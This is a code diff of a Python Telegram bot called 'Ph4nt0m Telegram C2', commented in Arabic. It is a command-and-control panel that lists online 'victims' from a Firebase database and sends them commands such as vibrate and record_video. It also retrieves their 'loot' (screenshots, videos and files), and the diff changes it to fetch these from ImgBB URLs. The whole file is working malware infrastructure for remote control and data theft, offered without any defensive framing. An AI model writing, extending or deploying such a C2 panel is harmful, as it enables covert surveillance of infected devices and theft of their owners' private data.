@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 """
-Ph4nt0m Telegram C2 - Worker + Web Hybrid (Render Ready)
+Ph4nt0m Telegram C2 - ImgBB Edition
+يستخدم ImgBB لرفع الصور والملفات.
 """
-import os, json, base64, threading
+import os, json, base64, threading, requests
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 from firebase_admin import credentials, initialize_app, db
 
-# ---------- إعدادات Flask (للمنفذ الوهمي) ----------
+# ---------- Flask (للمنفذ الوهمي) ----------
 flask_app = Flask(__name__)
-
 @flask_app.route('/')
 def home():
     return "System Active"
@@ -19,9 +19,10 @@ def run_flask():
     port = int(os.environ.get("PORT", 8000))
     flask_app.run(host='0.0.0.0', port=port)
 
-# ---------- إعدادات Firebase ----------
+# ---------- إعدادات Firebase و ImgBB ----------
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 FIREBASE_URL = os.environ["FIREBASE_URL"]
+IMGBB_API_KEY = os.environ["IMGBB_API_KEY"]
 
 firebase_creds = os.environ.get("FIREBASE_CREDS")
 if firebase_creds:
@@ -31,20 +32,23 @@ else:
     initialize_app(options={'databaseURL': FIREBASE_URL})
 
 victims_ref = db.reference('victims')
-current_victim = {}  # user_id -> victim_id
+current_victim = {}
 
-# ---------- دوال مساعدة ----------
 def get_online_victims():
     snap = victims_ref.get()
     if not snap: return {}
     return {k:v for k,v in snap.items() if v.get('online')}
 
-async def send_file_to_telegram(update, data_b64, filename, caption):
+async def send_file_from_url(update, url, filename, caption):
+    """تحميل الملف من ImgBB وإرساله إلى تيليجرام"""
     try:
-        file_bytes = base64.b64decode(data_b64)
-        await update.message.reply_document(document=file_bytes, filename=filename, caption=caption)
+        response = requests.get(url)
+        if response.status_code == 200:
+            await update.message.reply_document(document=response.content, filename=filename, caption=caption)
+        else:
+            await update.message.reply_text(f"فشل تحميل الملف: {url}")
     except Exception as e:
-        await update.message.reply_text(f"فشل إرسال الملف: {e}")
+        await update.message.reply_text(f"خطأ: {e}")
 
 # ---------- لوحات الأزرار ----------
 def get_victims_keyboard():
@@ -72,7 +76,6 @@ def get_control_keyboard():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ---------- الأوامر الأساسية ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "⚡ **Ph4nt0m C2 Bot**\n\nاختر زر 'عرض الضحايا' للتحكم.",
@@ -81,14 +84,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ])
     )
 
-# ---------- معالج الأزرار الرئيسي ----------
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
     data = query.data
 
-    # --- عرض القائمة الرئيسية ---
     if data == 'show_victims' or data == 'back_to_victims' or data == 'refresh_victims':
         vics = get_online_victims()
         if not vics:
@@ -98,11 +99,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         txt = "📟 **الضحايا المتصلين:**\nاختر جهازاً للتحكم."
         await query.edit_message_text(txt, reply_markup=get_victims_keyboard())
-        if current_victim.get(uid):
-            del current_victim[uid]
+        if current_victim.get(uid): del current_victim[uid]
         return
 
-    # --- اختيار ضحية ---
     if data.startswith('select_'):
         vid = data.replace('select_', '')
         vics = get_online_victims()
@@ -115,13 +114,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(txt, reply_markup=get_control_keyboard())
         return
 
-    # --- التحقق من وجود جلسة ---
     vid = current_victim.get(uid)
     if not vid:
         await query.edit_message_text("انتهت الجلسة. اختر ضحية من جديد:", reply_markup=get_victims_keyboard())
         return
 
-    # --- أمر مسح الجلسة ---
     if data == 'leave':
         victims_ref.child(vid).remove()
         if current_victim.get(uid) == vid: del current_victim[uid]
@@ -130,7 +127,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]))
         return
 
-    # --- عرض المسروقات ---
     if data == 'loot':
         loot = db.reference(f'victims/{vid}/loot').get()
         if not loot:
@@ -141,15 +137,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for key, item in items:
             typ = item.get('type')
             name = item.get('name', typ)
-            data64 = item.get('data')
-            if data64 and typ in ('screenshot','video','file'):
-                ext = 'png' if typ=='screenshot' else 'webm' if typ=='video' else ''
-                await send_file_to_telegram(query, data64, f"{name}.{ext}", f"📎 {name}")
+            url = item.get('url')
+            if url and typ in ('screenshot','video','file'):
+                # نرسل الملف من ImgBB إلى تيليجرام
+                await send_file_from_url(query, url, f"{name}.{'png' if typ=='screenshot' else 'webm' if typ=='video' else ''}", f"📎 {name}")
             else:
-                await query.message.reply_text(f"[{typ}] {name}")
+                await query.message.reply_text(f"[{typ}] {name} - لا يوجد رابط.")
         return
 
-    # --- الأوامر التنفيذية ---
+    # الأوامر التنفيذية
     params = {}
     if data == 'vibrate': params['duration'] = 5000
     elif data == 'record_video': params['duration'] = 10
@@ -158,7 +154,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     db.reference(f'victims/{vid}/command').set(cmd)
     await query.edit_message_text(f"✅ تم إرسال الأمر: {data}\nالجهاز: `{vid}`", reply_markup=get_control_keyboard())
 
-# ---------- بدء التشغيل ----------
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
@@ -167,6 +162,5 @@ def main():
     app.run_polling()
 
 if __name__ == "__main__":
-    # تشغيل السيرفر الوهمي في خيط
     threading.Thread(target=run_flask, daemon=True).start()
     main()
